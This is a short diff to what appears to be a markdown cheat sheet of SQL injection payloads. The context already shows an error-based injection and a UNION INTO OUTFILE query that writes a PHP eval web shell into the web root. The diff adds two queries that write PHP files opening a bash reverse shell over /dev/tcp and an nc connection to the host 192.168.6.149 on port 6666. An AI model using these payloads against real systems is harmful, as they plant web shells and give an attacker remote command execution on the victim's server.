@@ -130,5 +130,7 @@ select * from users where id='1' and updatexml(1, concat('~', (select database()
 
 ```sql
 select * from users where id=1 union select 1,'<?php eval($_REQUEST[cmd]) ?>',3 into outfile '/var/www/html/php_name.php';
+select * from users where id=1 union select 1,'<?php exec(\'bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1" \') ?>',3 into outfile '/var/www/html/php_name.php';
+select * from users where id=1 union select 1,'<?php exec("nc 192.168.6.149 6666") ?>',3 into outfile '/var/www/html/php_name.php';
 ```
 
